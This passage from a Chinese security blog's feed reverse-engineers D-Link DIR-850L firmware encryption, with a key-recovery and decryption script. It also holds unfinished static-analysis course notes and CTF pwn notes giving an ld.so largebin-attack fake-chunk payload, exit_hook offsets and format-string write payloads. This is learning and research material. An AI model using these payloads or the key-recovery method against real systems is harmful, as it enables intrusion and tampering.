处找到一处调用，我们可以看到第一个参数是6，第二个参数被赋值了很多类似于-i，-d之类的东西，结合
encrypt_main 函数是个 main，我们猜测第一个参数是
argc，第二个参数是argv</p>
<p>但是这里的赋值方式很奇怪，v116
是<code>struct stat</code>，是一个结构体，我们再去别的引用处看一下，可以在
encode_file_check 函数中发现这些参数其实是一个 char 数组，这就符合我们对
argv 的认知了。</p>
<p>我们按 y 键将 sub_407664 中的 v116 的数据类型修改成 char* 即可</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1iQJ.png" alt="l1iQJ.png" />
<figcaption aria-hidden="true">l1iQJ.png</figcaption>
</figure>
<p>接下来分析 argv 都是些什么东西<br />
- 第一个参数: encimg - 第二个参数: -i (将 v116
数据类型修改后，可以很明显的看到"-i"是 v117，而全局变量 ptr 才是 v118) -
第三个参数: ptr(在 encode_file_check 函数中我们可以看到，ptr 与
"/var/firmware.seama"
作了比较，因此我们猜测ptr可能是指向文件名字符串的指针) - 第四个参数: -s
- 第五个参数: byte_43CDB0(在 encode_file_check
函数中我们可以看到，byte_43CDB0 是从 <code>/etc/config/image_sign</code>
文件读出了128个字符，我们去看一下这个文件，发现里面是<code>wrgac25_dlink.2013gui_dir850l</code>)
- 第六个参数: -d</p>
<p>因此，我们传入的参数是<code>encimg -i file -s wrgac25_dlink.2013gui_dir850l -d</code></p>
<p>这也符合 argc = 6 的要求</p>
<h3 id="参数功能">参数功能</h3>
<p>我们知道，一般来说 -h 代表的是 help，所以我们查看一下 encrypt_main
函数的<code>case h:</code>会打印什么东西</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_408F8C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &#123;OPTIONS&#125;\n&quot;</span>, <span class="string">&quot;encimg&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -h                      : show this message.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -v                      : Verbose mode.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -i &#123;input image file&#125;   : input image file.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -e                      : encode file.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -d                      : decode file.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;   -s                      : signature.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而经过 switch-case 后，在 Line57 判断 dword_43CE40 也就是 signature
是否存在，这个是 -s 参数做的事情，而在 Line59 处判断 file
是否存在，如果两个都通过，就会调用 sub_4090E0 函数，我们继续跟进</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1qvD.png" alt="l1qvD.png" />
<figcaption aria-hidden="true">l1qvD.png</figcaption>
</figure>
<p>在 sub_4090E0
函数的前一部分中，做了文件校验等不是很重要的操作，而重要的解密操作从
<strong>Line108</strong> 开始，也就是下图位置，我已经加好注释了</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJCoX.png" alt="lJCoX.png" />
<figcaption aria-hidden="true">lJCoX.png</figcaption>
</figure>
<p>Line130-Line137 是设置AES加解密密钥<code>user_key</code>，而
Line108-Line129
是用<code>_____progs_board_fw_sign_data</code>初始化<code>user_key</code>，接着用
encrypt 函数对<code>user_key</code>做一些处理，我们跟进一下 encrypt
函数</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJP5U.png" alt="lJP5U.png" />
<figcaption aria-hidden="true">lJP5U.png</figcaption>
</figure>
<p>而设置好密钥以后，Line158 处调用 AES_cbc_encrypt
函数(如下图)，但我们通过<a
href="https://blog.csdn.net/duanxingheng/article/details/11730617">OpenSSL-AES</a>这篇文章知道，AES
不可能只有这么点参数，并且根据分析， v32 和 mmap_file_ptr 都是 mmap_file
，这肯定不对。</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJLr0.png" alt="lJLr0.png" />
<figcaption aria-hidden="true">lJLr0.png</figcaption>
</figure>
<p>所以我们按 y
键，将<code>AES_cbc_encrypt</code>修改为<code>void AES_cbc_encrypt(const unsigned char *in, unsigned char *out,   size_t length, const AES_KEY *key,    unsigned char *ivec, const int enc);</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>： 需要加密/解密的数据；</span><br><span class="line"></span><br><span class="line">out： 计算后输出的数据；</span><br><span class="line"></span><br><span class="line">length： 数据长度（这里不包含初始向量数据长度）</span><br><span class="line"></span><br><span class="line">key：密钥</span><br><span class="line"></span><br><span class="line">ivec： 初始向量（一般为<span class="number">16</span>字节全<span class="number">0</span>）</span><br><span class="line"></span><br><span class="line">enc： <span class="title function_">AES_ENCRYPT</span>(<span class="number">1</span>) 代表加密， <span class="title function_">AES_DECRYPT</span>(<span class="number">0</span>) 代表解密；</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJXIC.png" alt="lJXIC.png" />
<figcaption aria-hidden="true">lJXIC.png</figcaption>
</figure>
<p>现在我们可以看出，Line131-Line177 就是很标准的一个 AES 加解密</p>
<h1 id="解密脚本">解密脚本</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt_file</span>(<span class="params">key,iv,input_file,output_file</span>):</span><br><span class="line">    cipher = AES.new(<span class="built_in">bytes</span>(key),AES.MODE_CBC,<span class="built_in">bytes</span>(iv))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile, <span class="built_in">open</span>(output_file,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = infile.read(<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(chunk) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;aes error&quot;</span>)</span><br><span class="line">            decrypted_chunk = cipher.decrypt(chunk)</span><br><span class="line">            outfile.write(decrypted_chunk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">______progs_board_fw_sign_data =[<span class="number">0x6B</span>, <span class="number">0x35</span>, <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x2B</span>, <span class="number">0x62</span>, <span class="number">0x76</span>, <span class="number">0x57</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x5A</span>, <span class="number">0x36</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x74</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x4F</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x63</span>, <span class="number">0x69</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x5A</span>, <span class="number">0x71</span>, <span class="number">0x51</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x35</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x2B</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0x38</span>, <span class="number">0x62</span>, <span class="number">0x4E</span>, <span class="number">0x48</span>, <span class="number">0x5A</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x70</span>, <span class="number">0x36</span>, <span class="number">0x57</span>, <span class="number">0x43</span>, <span class="number">0x6C</span>, <span class="number">0x39</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x39</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x49</span>, <span class="number">0x6B</span>, <span class="number">0x69</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x0A</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, </span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x45</span>, <span class="number">0x50</span>, <span class="number">0x6F</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, </span><br><span class="line">  <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x46</span>, <span class="number">0x76</span>, <span class="number">0x39</span>, <span class="number">0x42</span>, <span class="number">0x4D</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x2B</span>, </span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, <span class="number">0x4F</span>, <span class="number">0x38</span>, <span class="number">0x4F</span>, <span class="number">0x75</span>, <span class="number">0x46</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x62</span>, <span class="number">0x7A</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x72</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x64</span>, <span class="number">0x4E</span>, </span><br><span class="line">  <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0x4C</span>, <span class="number">0x75</span>, <span class="number">0x4F</span>, <span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_val_by_sig</span>(<span class="params">dec_sig_val,dec_len,sig</span>): <span class="comment"># encrypt 函数 python表示</span></span><br><span class="line">    sig_len = <span class="built_in">len</span>(sig)</span><br><span class="line">    loop_sig_idx = <span class="number">0</span></span><br><span class="line">    loop_dec_idx = <span class="number">1</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cur_sig = sig[loop_sig_idx]</span><br><span class="line">        loop_sig_idx+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(idx&gt;=dec_len):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(loop_sig_idx&gt;=sig_len):</span><br><span class="line">            loop_sig_idx=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">        dec_sig_val[idx] = loop_dec_idx ^ dec_sig_val[idx] ^ <span class="built_in">ord</span>(cur_sig)</span><br><span class="line">        loop_dec_idx+=<span class="number">1</span></span><br><span class="line">        idx+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> loop_dec_idx &gt;= <span class="number">252</span>:</span><br><span class="line">            loop_dec_idx = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">aes_key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    aes_key.append(______progs_board_fw_sign_data[i+<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">iv = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">    iv.append(______progs_board_fw_sign_data[i+<span class="number">96</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv before dec: &#x27;</span>,iv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;aes_key before dec: &#x27;</span>,aes_key)</span><br><span class="line">dec_val_by_sig(iv,<span class="number">16</span>,<span class="string">&#x27;wrgac25_dlink.2013gui_dir850l&#x27;</span>)</span><br><span class="line">dec_val_by_sig(aes_key,<span class="number">32</span>,<span class="string">&#x27;wrgac25_dlink.2013gui_dir850l&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv before dec: &#x27;</span>,iv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;aes_key before dec: &#x27;</span>,aes_key)</span><br><span class="line"></span><br><span class="line">aes_decrypt_file(aes_key,iv,<span class="string">&#x27;/mnt/e/EdgeDownload/IOT/DIR850LB1_FW220WWb03.bin&#x27;</span>,<span class="string">&#x27;out.bin&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>解密后即可解包</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJZRR.png" alt="lJZRR.png" />
<figcaption aria-hidden="true">lJZRR.png</figcaption>
</figure>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>Mips</tag>
        <tag>Wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>CSBasics - NJU_Program_Analysis_Note</title>
    <url>/posts/61276.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
记录一下上课+做实验时产生的问题、思考与收获
</blockquote>
<span id="more"></span>
<h1 id="lecture1-introduction">[1] Lecture1 Introduction</h1>
<h2 id="what-is-static-analysis">[1-1] what is Static Analysis？</h2>
<p>Static Analysis is different with dynamic analysis, analyzers need to
construct static bird's view of the whole workflows. Besides, static
analyzers usually focus on the consequence of the analysis rather than
the process.</p>
<h2 id="what-is-a-good-static-analysis">[1-2] What is a good Static
Analysis?</h2>
<p>Before introducing what is a good static analysis, we need to find
out what is 'sound' and what is 'complete'.</p>
<p>sound: We describe a result is sound when it's reasonable. When a
result is sound, its false negative is low.</p>
<p>complete: We describe a result is complete because it's definitely
correct. When a result is complete, its false positive is low.</p>
<p>And in static analysis, we usually focus on <code>soundness</code>
rather than. I think it's probably because we'd rather manually check
the result than leave any posibility away.</p>
<h2 id="rices-theory">[1-3] Rice's Theory</h2>
<p>Unfortunately, Rice has proved (maybe? I forgot) that we can't give a
<code>perfect</code> static analysis to prove non-trivial properties on
a re programming language.</p>
<h2 id="examplebirds-view-of-techniques">[1-4] Example(Bird's view of
techniques)</h2>
<h3 id="abstract">[1-4-1] Abstract</h3>
<p>1, 0, -1 respectively represent [+] ,[0] and [-]</p>
<p><code>x &lt; y ? 1 : -1</code> represents [top] which means
unknown</p>
<p><code>1 / 0</code> represents [down] which means undefined</p>
<h3 id="over-approximation">[1-4-2] Over-Approximation</h3>
<ol type="1">
<li><p>considering of condition</p></li>
<li><p>considering of control flow</p></li>
</ol>
<h1 id="lecture2-intermediate-representation">[2] Lecture2 Intermediate
Representation</h1>
<h2 id="whats-the-difference-between-compiler-static-analyzer">[2-1]
What's the difference between compiler &amp; static analyzer?</h2>
<p>Compiler: source code -(Lexical analysis)-&gt; Tokens -(Syntax
analysis)-&gt; AST -(Semantic analysis)-&gt; Decorated AST
-(Translator)-&gt; IR -(Code generator)-&gt; Binary</p>
<p>And static analyzers are usually based on IR layer.</p>
<h2 id="ac-3-address-code">[2-2] 3AC: 3-Address-Code</h2>
<p>A common form of IR is 3AC. There is only one operator at the right
side of the equation. For example:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = a + c</span><br><span class="line">q = a * p</span><br><span class="line">p = q - d</span><br></pre></td></tr></table></figure>
<h2 id="control-flow-graphcfg">[2-3] Control Flow Graph(CFG)</h2>
<p>Control Flow Graph is constructed with nodes and edges. Nodes in
graph is called Basic blocks(BB), and edges in graph is just called
edge.</p>
<h3 id="basic-blocksbb">[2-3-1] Basic Blocks(BB)</h3>
<p>properties: - BB can be entered only at the start instructions. - BB
can be ended only by jump instructions</p>
<p>construct algorithm: - Input: list of IR instructions - Output: list
of BBs - Algo: - find the leader of a block 1. startpoint of the
instruction list 2. endpoint of a jump instruction 3. sequent
instruction of a jump instrcution - break at the jump instructions</p>
<h3 id="when-should-we-add-edges">[2-3-2] When should we add edges?</h3>
<ol type="1">
<li>2 edges follow branch instruction</li>
<li>1 edge follows jump instr without condition</li>
</ol>
<h1 id="lecture3-data-flow-analysis-i-overview-applications">[3]
Lecture3 Data Flow Analysis I (Overview &amp; Applications)</h1>
<h2 id="overview-of-data-flow-analysis">[3-1] Overview of Data flow
analysis</h2>
<h3 id="what-is-data-flow-analysis">[3-1-1] what is data flow
analysis?</h3>
<p>How _ Data(Abstraction) Flow(Safe-approximation) through the _ of
CFG</p>
<p>Node: Transfer function</p>
<p>Edge: Control flow function(union the signs at merges)</p>
<h3 id="whats-the-difference-between-may-analysis-must-analysis">[3-1-2]
what's the difference between may-analysis &amp; must-analysis?</h3>
<p>may:</p>
<p>must:</p>
<h2 id="preliminaries">[3-2] Preliminaries</h2>
<h3 id="input-output-state">[3-2-1] Input &amp; Output state</h3>
<p>property 1: Every execution of an IR statement transforms</p>
<p>property 2: The Input/output state is associated with a program
point(from view of state-machine)</p>
<h2 id="symbols">[3-2-2] Symbols</h2>
<p>meet operator: ∩</p>
<h2 id="section">[3-3]</h2>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>Program Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - IO_File and ld.so exploit summary</title>
    <url>/posts/46771.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
IO_File 与 ld.so 利用总结
</blockquote>
<span id="more"></span>
<h1 id="io_file">[1] IO_File</h1>
<p><a href="https://www.cnblogs.com/hawkJW/p/13546416.html">好文</a></p>
<p><a
href="https://mp.weixin.qq.com/s/OjMQjjI2ESfmZ5wwFbNhRQ">PIG-007</a></p>
<p><a href="https://bbs.kanxue.com/thread-276044.htm">glibc2.37
IO</a></p>
<h1 id="ld.so">[2] ld.so</h1>
<h2 id="rtld_global._dl_ns._ns_loaded">[2-1]
_rtld_global._dl_ns._ns_loaded</h2>
<h3 id="原理">[2-1-1] 原理</h3>
<p>程序在调用<code>exit()</code>退出时，会调用<code>(待调试)</code>，而我们可以通过修改
<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code></p>
<h3 id="找偏移量">[2-1-2] 找偏移量</h3>
<blockquote>
<p>恢复调试符号请看<a
href="https://heygap.github.io/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/#more">Pwn
- Heap Exploit Summary</a> 的 patchelf 部分</p>
</blockquote>
<p>恢复调试符号以后，在 pwndbg 中输入 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找 &amp;(_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next) </span></span><br><span class="line"><span class="comment"># 与 &amp;(_rtld_global) 之间的偏移量</span></span><br><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">0x7f992b424040-&gt;0x7f992b3f3018 is -0x31028 bytes (-0x6205 words)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找 _rtld_global 的真实地址</span></span><br><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line"><span class="variable">$1</span> = (struct rtld_global *) 0x7f8bb8255040 &lt;_rtld_global&gt;</span><br><span class="line"><span class="comment"># 若本次运行的 libc_base 为 0x7f8bb803a000</span></span><br><span class="line"><span class="comment"># 则 offset = 0x7f8bb8255040 - 0x7f8bb803a000 = 0x21b040</span></span><br><span class="line"><span class="comment"># 这个 offset 会在下面的 python 代码中用到</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计算 _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next 的真实地址</span></span><br><span class="line">rtld_global = libc_base + offset</span><br><span class="line">rtld_next_next_next = rtld_global -<span class="number">0x31028</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack 中</span></span><br><span class="line">target_addr = rtld_next_next_next</span><br><span class="line"><span class="comment"># 修改 chunk.bk_nextsize 时</span></span><br><span class="line">chunk.bk_nextsize = rtld_next_next_next - <span class="number">0x20</span></span><br></pre></td></tr></table></figure>
<p>largebin attack 以后，观察 _rtld_global，应该有这样一条链
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_rtld_global._dl_ns._ns_loaded        = 0x7f... head_node</span><br><span class="line">              |</span><br><span class="line">              |  (*_ns_loaded) + 0x18</span><br><span class="line">              v</span><br><span class="line">_rtld_global._dl_ns._ns_loaded.l_next = 0x7f... node_1</span><br><span class="line">              |</span><br><span class="line">              |  (*(xx.l_next)) + 0x18</span><br><span class="line">              v</span><br><span class="line">..._ns_loaded.l_next-&gt;l_next          = 0x7f... node_2</span><br><span class="line">              |</span><br><span class="line">              |  (*(xx-&gt;l_next)) + 0x18</span><br><span class="line">              v</span><br><span class="line">...l_next-&gt;l_next-&gt;l_next             = 0x55...(堆地址) node_3</span><br><span class="line"># 链上正好四个 node</span><br></pre></td></tr></table></figure></p>
<h3 id="构造-fake-chunk">[2-1-3] 构造 fake chunk</h3>
<p>我们假设： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                    |-----------|-----------|</span><br><span class="line">fake_rtld_global -&gt; | perv_size |    size   |</span><br><span class="line">                    |-----------|-----------|</span><br><span class="line">                    |       user_data       |</span><br><span class="line">                    |         . . .         |</span><br><span class="line">                    |-----------|-----------|</span><br></pre></td></tr></table></figure></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我看的 wp 大多数都在构造 fake chunk 时用到了 libc + 一个偏移量,</span></span><br><span class="line"><span class="comment"># 但我这样构造也能 getshell,</span></span><br><span class="line"><span class="comment"># 以下就只需要修改 heap_base 和 offset 就行,</span></span><br><span class="line"><span class="comment"># 对 libc 的要求小了很多.</span></span><br><span class="line">heap_base = 堆的基地址</span><br><span class="line">offset    = fake chunk 的 prev_size 地址</span><br><span class="line">fake_rtld_global = heap_base + offset</span><br><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_rtld_global)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x58</span>) + p64(<span class="number">0x8</span>) + p64(one_gadget[<span class="number">0</span>])</span><br><span class="line">payload  = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x40</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x48</span>)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x30c</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x1c</span>)</span><br></pre></td></tr></table></figure>
<p>最后构造的 chunk 应该如下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0x5644419bbcd0 40</span><br><span class="line">00:0000│  0x5644419bbcd0 ◂— 0x0</span><br><span class="line">01:0008│  0x5644419bbcd8 ◂— 0x521</span><br><span class="line">02:0010│  0x5644419bbce0 ◂— 0x0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">05:0028│  0x5644419bbcf8 —▸ 0x5644419bbcd0 ◂— 0x0</span><br><span class="line">06:0030│  0x5644419bbd00 ◂— 0x0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">09:0048│  0x5644419bbd18 —▸ 0x5644419bbd28 —▸ 0x7f77ff49154c (execvpe+652) ◂— mov rdx, r12</span><br><span class="line">0a:0050│  0x5644419bbd20 ◂— 0x8</span><br><span class="line">0b:0058│  0x5644419bbd28 —▸ 0x7f77ff49154c (execvpe+652) ◂— mov rdx, r12</span><br><span class="line">0c:0060│  0x5644419bbd30 ◂— 0x0</span><br><span class="line">... ↓     21 skipped</span><br><span class="line">22:0110│  0x5644419bbde0 —▸ 0x5644419bbd10 ◂— 0x0</span><br><span class="line">23:0118│  0x5644419bbde8 ◂— 0x0</span><br><span class="line">24:0120│  0x5644419bbdf0 —▸ 0x5644419bbd18 —▸ 0x5644419bbd28 —▸ 0x7f77ff49154c (execvpe+652) ◂— mov rdx, r12</span><br><span class="line">25:0128│  0x5644419bbdf8 ◂— 0x0</span><br><span class="line">... ↓     2 skipped</span><br></pre></td></tr></table></figure>
<h2 id="rtld_global.exit_hook">[2-2] _rtld_global.exit_hook</h2>
<blockquote>
<p>libc: 2.23 / 2.27 (其他版本未记录)</p>
</blockquote>
<h3 id="exit_hook-调用链">[2-2-1] exit_hook 调用链</h3>
<p>exit --&gt; __run_exit_handlers --&gt; _dl_fini --&gt;
__rtld_lock_lock_recursive / __rtld_lock_unlock_recursive</p>
<h3 id="poc">[2-2-2] POC</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb 中输入</span></span><br><span class="line">p _rtld_global # 查看 exit_hook 调用的两个 recursive 函数的地址</span><br><span class="line"></span><br><span class="line">p __rtld_lock_unlock_recursive # 查看 __rtld_lock_unlock_recursive 指向的数据</span><br></pre></td></tr></table></figure>
<p>libc2.23 中：</p>
<p>exit_hook_addr = libc_base+0x5f0040+3848</p>
<p>exit_hook_addr = libc_base+0x5f0040+3856</p>
<p>在libc-2.27中</p>
<p>exit_hook_addr = libc_base+0x619060+3840</p>
<p>exit_hook_addr = libc_base+0x619060+3848</p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Format String Summary</title>
    <url>/posts/61241.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下格式化字符串漏洞，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="原理-工具">原理 &amp; 工具</h1>
<h2 id="原理">原理</h2>
<blockquote>
<p>本质是利用 printf(string) 任意地址读写</p>
</blockquote>
<blockquote>
<p>记录一下常用的格式</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt    :        标准作用       ||           常用方式</span><br><span class="line">——————————————————————————————————————————————————————————————</span><br><span class="line">%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary</span><br><span class="line">%s     :   输出地址指向的内容   ||     (读) 泄露libc_base</span><br><span class="line">%hhn   :   修改地址指向的byte   |        (写) 任意地址写</span><br><span class="line">%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写</span><br></pre></td></tr></table></figure>
<h2 id="工具-pwntools---fmtstr_payload">工具: Pwntools -
fmtstr_payload</h2>
<p><a href="https://docs.pwntools.com/en/stable/fmtstr.html">Pwntools -
class fmtstr</a></p>
<blockquote>
<p>源码见上述链接或文章末尾的 Appendix</p>
</blockquote>
<p>fmtstr是一个类，我们只需要用其中的 fmtstr_payload 来构造我们的
payload 即可。现在版本的 pwntools 已经支持 64 位的 格式化字符串 payload
生成了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default: numbwritten=0 , write_size=<span class="string">&#x27;byte&#x27;</span></span></span><br><span class="line">payload = fmtstr_payload(offset, writes, numbwritten=, write_size=&#x27;&#x27;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example:</span></span><br><span class="line">context.clear(arch = &#x27;amd64&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">context.clear(arch = &#x27;i386&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%5$na\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, 